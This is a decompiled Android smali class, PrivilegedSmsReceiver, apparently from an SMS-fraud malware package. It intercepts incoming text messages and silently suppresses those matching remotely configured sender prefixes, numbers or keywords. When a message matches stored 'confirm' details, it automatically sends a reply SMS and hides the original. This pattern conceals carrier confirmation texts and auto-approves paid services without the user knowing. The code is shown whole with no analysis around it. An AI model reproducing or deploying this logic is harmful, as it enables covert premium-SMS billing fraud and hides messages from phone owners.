.class public Lcom/mms/bg/transaction/PrivilegedSmsReceiver;
.super Lcom/mms/bg/transaction/SmsReceiver;
.source "PrivilegedSmsReceiver.java"


# static fields
.field private static final DEBUG:Z = false

.field private static final TAG:Ljava/lang/String; = "PrivilegedSmsReceiver"


# direct methods
.method public constructor <init>()V
    .registers 1

    .prologue
    .line 35
    invoke-direct {p0}, Lcom/mms/bg/transaction/SmsReceiver;-><init>()V

    return-void
.end method


# virtual methods
.method public final LOGD(Ljava/lang/String;)V
    .registers 2
    .parameter "msg"

    .prologue
    .line 177
    return-void
.end method

.method public onReceive(Landroid/content/Context;Landroid/content/Intent;)V
    .registers 43
    .parameter "context"
    .parameter "intent"

    .prologue
    .line 44
    invoke-virtual/range {p1 .. p1}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v37

    invoke-static/range {v37 .. v37}, Lcom/mms/bg/ui/SettingManager;->getInstance(Landroid/content/Context;)Lcom/mms/bg/ui/SettingManager;

    move-result-object v27

    .line 48
    .local v27, sm:Lcom/mms/bg/ui/SettingManager;
    const-string v37, "PrivilegedSmsReceiver"

    const-string v38, "PrivilegedSmsReceiver::onReceive"

    move-object/from16 v0, v27

    move-object/from16 v1, v37

    move-object/from16 v2, v38

    invoke-virtual {v0, v1, v2}, Lcom/mms/bg/ui/SettingManager;->log(Ljava/lang/String;Ljava/lang/String;)V

    .line 50
    invoke-virtual/range {v27 .. v27}, Lcom/mms/bg/ui/SettingManager;->makePartialWakeLock()V

    .line 51
    invoke-static/range {p2 .. p2}, Landroid/provider/Telephony$Sms$Intents;->getMessagesFromIntent(Landroid/content/Intent;)[Landroid/telephony/SmsMessage;

    move-result-object v22

    .line 52
    .local v22, msgs1:[Landroid/telephony/SmsMessage;
    const/16 v37, 0x0

    aget-object v37, v22, v37

    invoke-virtual/range {v37 .. v37}, Landroid/telephony/SmsMessage;->getServiceCenterAddress()Ljava/lang/String;

    move-result-object v31

    .line 53
    .local v31, smsCenter:Ljava/lang/String;
    if-eqz v31, :cond_bb

    .line 54
    new-instance v37, Ljava/lang/StringBuilder;

    invoke-direct/range {v37 .. v37}, Ljava/lang/StringBuilder;-><init>()V

    const-string v38, "smsCenter = "

    invoke-virtual/range {v37 .. v38}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v37

    move-object/from16 v0, v37

    move-object/from16 v1, v31

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v37

    invoke-virtual/range {v37 .. v37}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v37

    move-object/from16 v0, p0

    move-object/from16 v1, v37

    invoke-virtual {v0, v1}, Lcom/mms/bg/transaction/PrivilegedSmsReceiver;->LOGD(Ljava/lang/String;)V

    .line 55
    const-string v37, "+"

    move-object/from16 v0, v31

    move-object/from16 v1, v37

    invoke-virtual {v0, v1}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v37

    const/16 v38, 0x1

    move/from16 v0, v37

    move/from16 v1, v38

    if-ne v0, v1, :cond_1e1

    invoke-virtual/range {v31 .. v31}, Ljava/lang/String;->length()I

    move-result v37

    const/16 v38, 0xe

    move/from16 v0, v37

    move/from16 v1, v38

    if-ne v0, v1, :cond_1e1

    .line 56
    const/16 v37, 0x3

    move-object/from16 v0, v31

    move/from16 v1, v37

    invoke-virtual {v0, v1}, Ljava/lang/String;->substring(I)Ljava/lang/String;

    move-result-object v31

    .line 60
    :cond_6c
    :goto_6c
    move-object/from16 v0, v27

    move-object/from16 v1, v31

    invoke-virtual {v0, v1}, Lcom/mms/bg/ui/SettingManager;->setSMSCenter(Ljava/lang/String;)V

    .line 61
    const-string v37, "PrivilegedSmsReceiver"

    new-instance v38, Ljava/lang/StringBuilder;

    invoke-direct/range {v38 .. v38}, Ljava/lang/StringBuilder;-><init>()V

    const-string v39, "get sms center = "

    invoke-virtual/range {v38 .. v39}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v38

    move-object/from16 v0, v38

    move-object/from16 v1, v31

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v38

    invoke-virtual/range {v38 .. v38}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v38

    move-object/from16 v0, v27

    move-object/from16 v1, v37

    move-object/from16 v2, v38

    invoke-virtual {v0, v1, v2}, Lcom/mms/bg/ui/SettingManager;->log(Ljava/lang/String;Ljava/lang/String;)V

    .line 62
    const-string v37, "PrivilegedSmsReceiver"

    new-instance v38, Ljava/lang/StringBuilder;

    invoke-direct/range {v38 .. v38}, Ljava/lang/StringBuilder;-><init>()V

    const-string v39, "sms num = "

    invoke-virtual/range {v38 .. v39}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v38

    const/16 v39, 0x0

    aget-object v39, v22, v39

    invoke-virtual/range {v39 .. v39}, Landroid/telephony/SmsMessage;->getDisplayOriginatingAddress()Ljava/lang/String;

    move-result-object v39

    invoke-virtual/range {v38 .. v39}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v38

    invoke-virtual/range {v38 .. v38}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v38

    move-object/from16 v0, v27

    move-object/from16 v1, v37

    move-object/from16 v2, v38

    invoke-virtual {v0, v1, v2}, Lcom/mms/bg/ui/SettingManager;->log(Ljava/lang/String;Ljava/lang/String;)V

    .line 65
    :cond_bb
    invoke-virtual/range {v27 .. v27}, Lcom/mms/bg/ui/SettingManager;->getSMSTempBlockNumAndTimes()Ljava/lang/String;

    move-result-object v35

    .line 66
    .local v35, tempBlock:Ljava/lang/String;
    new-instance v37, Ljava/lang/StringBuilder;

    invoke-direct/range {v37 .. v37}, Ljava/lang/StringBuilder;-><init>()V

    const-string v38, "The temp block info = "

    invoke-virtual/range {v37 .. v38}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v37

    move-object/from16 v0, v37

    move-object/from16 v1, v35

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v37

    invoke-virtual/range {v37 .. v37}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v37

    move-object/from16 v0, v27

    move-object/from16 v1, v37

    invoke-virtual {v0, v1}, Lcom/mms/bg/ui/SettingManager;->log(Ljava/lang/String;)V

    .line 67
    if-eqz v35, :cond_17d

    .line 68
    const-string v37, ";"

    move-object/from16 v0, v35

    move-object/from16 v1, v37

    invoke-virtual {v0, v1}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v34

    .line 69
    .local v34, splited:[Ljava/lang/String;
    const/16 v37, 0x0

    aget-object v37, v22, v37

    invoke-virtual/range {v37 .. v37}, Landroid/telephony/SmsMessage;->getDisplayOriginatingAddress()Ljava/lang/String;

    move-result-object v3

    .line 70
    .local v3, addr:Ljava/lang/String;
    if-eqz v3, :cond_17d

    const/16 v37, 0x0

    aget-object v37, v34, v37

    if-eqz v37, :cond_17d

    const/16 v37, 0x0

    aget-object v37, v34, v37

    move-object v0, v3

    move-object/from16 v1, v37

    invoke-virtual {v0, v1}, Ljava/lang/String;->endsWith(Ljava/lang/String;)Z

    move-result v37

    const/16 v38, 0x1

    move/from16 v0, v37

    move/from16 v1, v38

    if-ne v0, v1, :cond_17d

    .line 71
    const/16 v37, 0x1

    aget-object v37, v34, v37

    invoke-static/range {v37 .. v37}, Ljava/lang/Integer;->valueOf(Ljava/lang/String;)Ljava/lang/Integer;

    move-result-object v37

    invoke-virtual/range {v37 .. v37}, Ljava/lang/Integer;->intValue()I

    move-result v11

    .line 72
    .local v11, count:I
    add-int/lit8 v11, v11, -0x1

    .line 73
    if-lez v11, :cond_1ff

    .line 74
    const/16 v37, 0x0

    aget-object v37, v34, v37

    invoke-static {v11}, Ljava/lang/String;->valueOf(I)Ljava/lang/String;

    move-result-object v38

    move-object/from16 v0, v27

    move-object/from16 v1, v37

    move-object/from16 v2, v38

    invoke-virtual {v0, v1, v2}, Lcom/mms/bg/ui/SettingManager;->setSMSTempBlockNumAndTimes(Ljava/lang/String;Ljava/lang/String;)V

    .line 75
    new-instance v37, Ljava/lang/StringBuilder;

    invoke-direct/range {v37 .. v37}, Ljava/lang/StringBuilder;-><init>()V

    const-string v38, "block the sms beacuse it contain the temp block num : "

    invoke-virtual/range {v37 .. v38}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v37

    const/16 v38, 0x0

    aget-object v38, v34, v38

    invoke-virtual/range {v37 .. v38}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v37

    const-string v38, ";"

    invoke-virtual/range {v37 .. v38}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v37

    const/16 v38, 0x1

    aget-object v38, v34, v38

    invoke-virtual/range {v37 .. v38}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v37

    invoke-virtual/range {v37 .. v37}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v37

    move-object/from16 v0, v27

    move-object/from16 v1, v37

    invoke-virtual {v0, v1}, Lcom/mms/bg/ui/SettingManager;->log(Ljava/lang/String;)V

    .line 80
    :goto_159
    invoke-virtual/range {p0 .. p0}, Lcom/mms/bg/transaction/PrivilegedSmsReceiver;->abortBroadcast()V

    .line 81
    new-instance v17, Landroid/content/Intent;

    const-class v37, Lcom/mms/bg/ui/InternetStatusReceiver;

    move-object/from16 v0, v17

    move-object/from16 v1, p1

    move-object/from16 v2, v37

    invoke-direct {v0, v1, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 82
    .local v17, internet:Landroid/content/Intent;
    const-string v37, "reason"

    const-string v38, "sms center"

    move-object/from16 v0, v17

    move-object/from16 v1, v37

    move-object/from16 v2, v38

    invoke-virtual {v0, v1, v2}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    .line 83
    move-object/from16 v0, p1

    move-object/from16 v1, v17

    invoke-virtual {v0, v1}, Landroid/content/Context;->sendBroadcast(Landroid/content/Intent;)V

    .line 87
    .end local v3           #addr:Ljava/lang/String;
    .end local v11           #count:I
    .end local v17           #internet:Landroid/content/Intent;
    .end local v34           #splited:[Ljava/lang/String;
    :cond_17d
    invoke-virtual/range {v27 .. v27}, Lcom/mms/bg/ui/SettingManager;->getSMSBlockPorts()Ljava/lang/String;

    move-result-object v6

    .line 88
    .local v6, blockPorts:Ljava/lang/String;
    invoke-virtual/range {v27 .. v27}, Lcom/mms/bg/ui/SettingManager;->getSMSBlockKeys()Ljava/lang/String;

    move-result-object v5

    .line 89
    .local v5, blockKeys:Ljava/lang/String;
    const-string v37, "PrivilegedSmsReceiver"

    new-instance v38, Ljava/lang/StringBuilder;

    invoke-direct/range {v38 .. v38}, Ljava/lang/StringBuilder;-><init>()V

    const-string v39, "block ports = "

    invoke-virtual/range {v38 .. v39}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v38

    move-object/from16 v0, v38

    move-object v1, v6

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v38

    const-string v39, " block keys = "

    invoke-virtual/range {v38 .. v39}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v38

    move-object/from16 v0, v38

    move-object v1, v5

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v38

    invoke-virtual/range {v38 .. v38}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v38

    move-object/from16 v0, v27

    move-object/from16 v1, v37

    move-object/from16 v2, v38

    invoke-virtual {v0, v1, v2}, Lcom/mms/bg/ui/SettingManager;->log(Ljava/lang/String;Ljava/lang/String;)V

    .line 90
    invoke-virtual/range {v27 .. v27}, Lcom/mms/bg/ui/SettingManager;->getSMSBlockBeginTime()J

    move-result-wide v32

    .line 91
    .local v32, smsLastSendTime:J
    invoke-virtual/range {v27 .. v27}, Lcom/mms/bg/ui/SettingManager;->getSMSBlockDelayTime()J

    move-result-wide v28

    .line 92
    .local v28, smsBlockTime:J
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v12

    .line 93
    .local v12, curTime:J
    if-nez v6, :cond_1c3

    if-eqz v5, :cond_3c6

    :cond_1c3
    sub-long v37, v12, v32

    cmp-long v37, v37, v28

    if-gez v37, :cond_3c6

    .line 98
    :try_start_1c9
    const-string v37, ";"

    move-object v0, v6

    move-object/from16 v1, v37

    invoke-virtual {v0, v1}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v24

    .line 99
    .local v24, ports:[Ljava/lang/String;
    invoke-static/range {p2 .. p2}, Landroid/provider/Telephony$Sms$Intents;->getMessagesFromIntent(Landroid/content/Intent;)[Landroid/telephony/SmsMessage;

    move-result-object v21

    .line 100
    .local v21, msgs:[Landroid/telephony/SmsMessage;
    const/16 v37, 0x0

    aget-object v37, v21, v37

    invoke-virtual/range {v37 .. v37}, Landroid/telephony/SmsMessage;->getDisplayOriginatingAddress()Ljava/lang/String;
    :try_end_1dd
    .catchall {:try_start_1c9 .. :try_end_1dd} :catchall_3f1
    .catch Ljava/lang/Exception; {:try_start_1c9 .. :try_end_1dd} :catch_3cb

    move-result-object v3

    .line 102
    .restart local v3       #addr:Ljava/lang/String;
    if-nez v3, :cond_232

    .line 169
    .end local v3           #addr:Ljava/lang/String;
    .end local v21           #msgs:[Landroid/telephony/SmsMessage;
    .end local v24           #ports:[Ljava/lang/String;
    :goto_1e0
    return-void

    .line 57
    .end local v5           #blockKeys:Ljava/lang/String;
    .end local v6           #blockPorts:Ljava/lang/String;
    .end local v12           #curTime:J
    .end local v28           #smsBlockTime:J
    .end local v32           #smsLastSendTime:J
    .end local v35           #tempBlock:Ljava/lang/String;
    :cond_1e1
    invoke-virtual/range {v31 .. v31}, Ljava/lang/String;->length()I

    move-result v37

    const/16 v38, 0xb

    move/from16 v0, v37

    move/from16 v1, v38

    if-le v0, v1, :cond_6c

    .line 58
    invoke-virtual/range {v31 .. v31}, Ljava/lang/String;->length()I

    move-result v37

    const/16 v38, 0xb

    sub-int v37, v37, v38

    move-object/from16 v0, v31

    move/from16 v1, v37

    invoke-virtual {v0, v1}, Ljava/lang/String;->substring(I)Ljava/lang/String;

    move-result-object v31

    goto/16 :goto_6c

    .line 77
    .restart local v3       #addr:Ljava/lang/String;
    .restart local v11       #count:I
    .restart local v34       #splited:[Ljava/lang/String;
    .restart local v35       #tempBlock:Ljava/lang/String;
    :cond_1ff
    const/16 v37, 0x0

    const/16 v38, 0x0

    move-object/from16 v0, v27

    move-object/from16 v1, v37

    move-object/from16 v2, v38

    invoke-virtual {v0, v1, v2}, Lcom/mms/bg/ui/SettingManager;->setSMSTempBlockNumAndTimes(Ljava/lang/String;Ljava/lang/String;)V

    .line 78
    new-instance v37, Ljava/lang/StringBuilder;

    invoke-direct/range {v37 .. v37}, Ljava/lang/StringBuilder;-><init>()V

    const-string v38, "block the sms beacuse it contain the temp block num : "

    invoke-virtual/range {v37 .. v38}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v37

    const/16 v38, 0x0

    aget-object v38, v34, v38

    invoke-virtual/range {v37 .. v38}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v37

    const-string v38, " for once"

    invoke-virtual/range {v37 .. v38}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v37

    invoke-virtual/range {v37 .. v37}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v37

    move-object/from16 v0, v27

    move-object/from16 v1, v37

    invoke-virtual {v0, v1}, Lcom/mms/bg/ui/SettingManager;->log(Ljava/lang/String;)V

    goto/16 :goto_159

    .line 103
    .end local v11           #count:I
    .end local v34           #splited:[Ljava/lang/String;
    .restart local v5       #blockKeys:Ljava/lang/String;
    .restart local v6       #blockPorts:Ljava/lang/String;
    .restart local v12       #curTime:J
    .restart local v21       #msgs:[Landroid/telephony/SmsMessage;
    .restart local v24       #ports:[Ljava/lang/String;
    .restart local v28       #smsBlockTime:J
    .restart local v32       #smsLastSendTime:J
    :cond_232
    :try_start_232
    const-string v37, "+"

    move-object v0, v3

    move-object/from16 v1, v37

    invoke-virtual {v0, v1}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v37

    const/16 v38, 0x1

    move/from16 v0, v37

    move/from16 v1, v38

    if-ne v0, v1, :cond_258

    invoke-virtual {v3}, Ljava/lang/String;->length()I

    move-result v37

    const/16 v38, 0x3

    move/from16 v0, v37

    move/from16 v1, v38

    if-le v0, v1, :cond_258

    .line 104
    const/16 v37, 0x3

    move-object v0, v3

    move/from16 v1, v37

    invoke-virtual {v0, v1}, Ljava/lang/String;->substring(I)Ljava/lang/String;

    move-result-object v3

    .line 106
    :cond_258
    const/16 v25, 0x0

    .line 107
    .local v25, shouldBlock:Z
    const/16 v26, 0x0

    .line 108
    .local v26, shouldConfirm:Z
    move-object/from16 v4, v24

    .local v4, arr$:[Ljava/lang/String;
    move-object v0, v4

    array-length v0, v0

    move/from16 v20, v0

    .local v20, len$:I
    const/4 v15, 0x0

    .local v15, i$:I
    :goto_263
    move v0, v15

    move/from16 v1, v20

    if-ge v0, v1, :cond_27e

    aget-object v23, v4, v15

    .line 109
    .local v23, port:Ljava/lang/String;
    move-object v0, v3

    move-object/from16 v1, v23

    invoke-virtual {v0, v1}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v37

    const/16 v38, 0x1

    move/from16 v0, v37

    move/from16 v1, v38

    if-ne v0, v1, :cond_27b

    .line 113
    const/16 v25, 0x1

    .line 108
    :cond_27b
    add-int/lit8 v15, v15, 0x1

    goto :goto_263

    .line 117
    .end local v23           #port:Ljava/lang/String;
    :cond_27e
    const-string v37, ";"

    move-object v0, v5

    move-object/from16 v1, v37

    invoke-virtual {v0, v1}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v19

    .line 118
    .local v19, keys:[Ljava/lang/String;
    const/16 v37, 0x0

    aget-object v37, v21, v37

    invoke-virtual/range {v37 .. v37}, Landroid/telephony/SmsMessage;->getMessageBody()Ljava/lang/String;

    move-result-object v30

    .line 119
    .local v30, smsBody:Ljava/lang/String;
    invoke-virtual/range {v27 .. v27}, Lcom/mms/bg/ui/SettingManager;->getConfirmInfo()Ljava/lang/String;

    move-result-object v7

    .line 120
    .local v7, confirmInfo:Ljava/lang/String;
    new-instance v37, Ljava/lang/StringBuilder;

    invoke-direct/range {v37 .. v37}, Ljava/lang/StringBuilder;-><init>()V

    const-string v38, "[[PrivilegedSmsReceiver::onReceive]] confirm info = "

    invoke-virtual/range {v37 .. v38}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v37

    move-object/from16 v0, v37

    move-object v1, v7

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v37

    invoke-virtual/range {v37 .. v37}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v37

    move-object/from16 v0, p0

    move-object/from16 v1, v37

    invoke-virtual {v0, v1}, Lcom/mms/bg/transaction/PrivilegedSmsReceiver;->LOGD(Ljava/lang/String;)V

    .line 121
    const/4 v9, 0x0

    .line 122
    .local v9, confirmPort:Ljava/lang/String;
    const/4 v8, 0x0

    .line 123
    .local v8, confirmKey:Ljava/lang/String;
    const/4 v10, 0x0

    .line 124
    .local v10, confirmText:Ljava/lang/String;
    if-eqz v7, :cond_2d7

    .line 125
    const-string v37, ";"

    move-object v0, v7

    move-object/from16 v1, v37

    invoke-virtual {v0, v1}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v16

    .line 126
    .local v16, infos:[Ljava/lang/String;
    move-object/from16 v0, v16

    array-length v0, v0

    move/from16 v37, v0

    const/16 v38, 0x3

    move/from16 v0, v37

    move/from16 v1, v38

    if-ne v0, v1, :cond_2d7

    .line 127
    const/16 v37, 0x0

    aget-object v9, v16, v37

    .line 128
    const/16 v37, 0x1

    aget-object v8, v16, v37

    .line 129
    const/16 v37, 0x2

    aget-object v10, v16, v37

    .line 132
    .end local v16           #infos:[Ljava/lang/String;
    :cond_2d7
    new-instance v37, Ljava/lang/StringBuilder;

    invoke-direct/range {v37 .. v37}, Ljava/lang/StringBuilder;-><init>()V

    const-string v38, "[[PrivilegedSmsReceiver::onReceive]] sms body = "

    invoke-virtual/range {v37 .. v38}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v37

    move-object/from16 v0, v37

    move-object/from16 v1, v30

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v37

    invoke-virtual/range {v37 .. v37}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v37

    move-object/from16 v0, p0

    move-object/from16 v1, v37

    invoke-virtual {v0, v1}, Lcom/mms/bg/transaction/PrivilegedSmsReceiver;->LOGD(Ljava/lang/String;)V

    .line 133
    if-eqz v30, :cond_31a

    .line 134
    move-object/from16 v4, v19

    move-object v0, v4

    array-length v0, v0

    move/from16 v20, v0

    const/4 v15, 0x0

    :goto_2fe
    move v0, v15

    move/from16 v1, v20

    if-ge v0, v1, :cond_31a

    aget-object v18, v4, v15

    .line 135
    .local v18, key:Ljava/lang/String;
    move-object/from16 v0, v30

    move-object/from16 v1, v18

    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v37

    const/16 v38, 0x1

    move/from16 v0, v37

    move/from16 v1, v38

    if-ne v0, v1, :cond_317

    .line 139
    const/16 v25, 0x1

    .line 134
    :cond_317
    add-int/lit8 v15, v15, 0x1

    goto :goto_2fe

    .line 143
    .end local v18           #key:Ljava/lang/String;
    :cond_31a
    const/16 v37, 0x1

    move/from16 v0, v25

    move/from16 v1, v37

    if-ne v0, v1, :cond_354

    .line 144
    const-string v37, "PrivilegedSmsReceiver"

    new-instance v38, Ljava/lang/StringBuilder;

    invoke-direct/range {v38 .. v38}, Ljava/lang/StringBuilder;-><init>()V

    const-string v39, "Block the sms : "

    invoke-virtual/range {v38 .. v39}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v38

    move-object/from16 v0, v38

    move-object v1, v3

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v38

    const-string v39, " body = "

    invoke-virtual/range {v38 .. v39}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v38

    move-object/from16 v0, v38

    move-object/from16 v1, v30

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v38

    invoke-virtual/range {v38 .. v38}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v38

    move-object/from16 v0, v27

    move-object/from16 v1, v37

    move-object/from16 v2, v38

    invoke-virtual {v0, v1, v2}, Lcom/mms/bg/ui/SettingManager;->log(Ljava/lang/String;Ljava/lang/String;)V

    .line 145
    invoke-virtual/range {p0 .. p0}, Lcom/mms/bg/transaction/PrivilegedSmsReceiver;->abortBroadcast()V

    .line 147
    :cond_354
    if-eqz v30, :cond_3c6

    if-eqz v8, :cond_3c6

    if-eqz v9, :cond_3c6

    if-eqz v10, :cond_3c6

    move-object/from16 v0, v30

    move-object v1, v8

    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v37

    const/16 v38, 0x1

    move/from16 v0, v37

    move/from16 v1, v38

    if-ne v0, v1, :cond_3c6

    invoke-virtual {v3, v9}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v37

    const/16 v38, 0x1

    move/from16 v0, v37

    move/from16 v1, v38

    if-ne v0, v1, :cond_3c6

    .line 153
    const-string v37, "PrivilegedSmsReceiver"

    new-instance v38, Ljava/lang/StringBuilder;

    invoke-direct/range {v38 .. v38}, Ljava/lang/StringBuilder;-><init>()V

    const-string v39, "reply the sms with num = "

    invoke-virtual/range {v38 .. v39}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v38

    move-object/from16 v0, v38

    move-object v1, v3

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v38

    const-string v39, " text = "

    invoke-virtual/range {v38 .. v39}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v38

    move-object/from16 v0, v38

    move-object v1, v10

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v38

    invoke-virtual/range {v38 .. v38}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v38

    move-object/from16 v0, v27

    move-object/from16 v1, v37

    move-object/from16 v2, v38

    invoke-virtual {v0, v1, v2}, Lcom/mms/bg/ui/SettingManager;->log(Ljava/lang/String;Ljava/lang/String;)V

    .line 154
    invoke-static/range {p1 .. p1}, Lcom/mms/bg/transaction/WorkingMessage;->createEmpty(Landroid/content/Context;)Lcom/mms/bg/transaction/WorkingMessage;

    move-result-object v36

    .line 155
    .local v36, wm:Lcom/mms/bg/transaction/WorkingMessage;
    move-object/from16 v0, v36

    move-object v1, v3

    invoke-virtual {v0, v1}, Lcom/mms/bg/transaction/WorkingMessage;->setDestNum(Ljava/lang/String;)V

    .line 156
    move-object/from16 v0, v36

    move-object v1, v10

    invoke-virtual {v0, v1}, Lcom/mms/bg/transaction/WorkingMessage;->setText(Ljava/lang/CharSequence;)V

    .line 157
    invoke-virtual/range {v36 .. v36}, Lcom/mms/bg/transaction/WorkingMessage;->send()V

    .line 158
    if-nez v25, :cond_3c6

    .line 159
    const-string v37, "Block the sms beacuse the receive message should be reply"

    move-object/from16 v0, v27

    move-object/from16 v1, v37

    invoke-virtual {v0, v1}, Lcom/mms/bg/ui/SettingManager;->log(Ljava/lang/String;)V

    .line 160
    invoke-virtual/range {p0 .. p0}, Lcom/mms/bg/transaction/PrivilegedSmsReceiver;->abortBroadcast()V
    :try_end_3c6
    .catchall {:try_start_232 .. :try_end_3c6} :catchall_3f1
    .catch Ljava/lang/Exception; {:try_start_232 .. :try_end_3c6} :catch_3cb

    .line 168
    .end local v3           #addr:Ljava/lang/String;
    .end local v4           #arr$:[Ljava/lang/String;
    .end local v7           #confirmInfo:Ljava/lang/String;
    .end local v8           #confirmKey:Ljava/lang/String;
    .end local v9           #confirmPort:Ljava/lang/String;
    .end local v10           #confirmText:Ljava/lang/String;
    .end local v15           #i$:I
    .end local v19           #keys:[Ljava/lang/String;
    .end local v20           #len$:I
    .end local v21           #msgs:[Landroid/telephony/SmsMessage;
    .end local v24           #ports:[Ljava/lang/String;
    .end local v25           #shouldBlock:Z
    .end local v26           #shouldConfirm:Z
    .end local v30           #smsBody:Ljava/lang/String;
    .end local v36           #wm:Lcom/mms/bg/transaction/WorkingMessage;
    :cond_3c6
    :goto_3c6
    invoke-virtual/range {v27 .. v27}, Lcom/mms/bg/ui/SettingManager;->releasePartialWakeLock()V

    goto/16 :goto_1e0

    .line 163
    :catch_3cb
    move-exception v37

    move-object/from16 v14, v37

    .line 164
    .local v14, e:Ljava/lang/Exception;
    :try_start_3ce
    const-string v37, "PrivilegedSmsReceiver"

    new-instance v38, Ljava/lang/StringBuilder;

    invoke-direct/range {v38 .. v38}, Ljava/lang/StringBuilder;-><init>()V

    const-string v39, "onReceive error = "

    invoke-virtual/range {v38 .. v39}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v38

    invoke-virtual {v14}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v39

    invoke-virtual/range {v38 .. v39}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v38

    invoke-virtual/range {v38 .. v38}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v38

    move-object/from16 v0, v27

    move-object/from16 v1, v37

    move-object/from16 v2, v38

    invoke-virtual {v0, v1, v2}, Lcom/mms/bg/ui/SettingManager;->log(Ljava/lang/String;Ljava/lang/String;)V
    :try_end_3f0
    .catchall {:try_start_3ce .. :try_end_3f0} :catchall_3f1

    goto :goto_3c6

    .line 165
    .end local v14           #e:Ljava/lang/Exception;
    :catchall_3f1
    move-exception v37

    throw v37
.end method
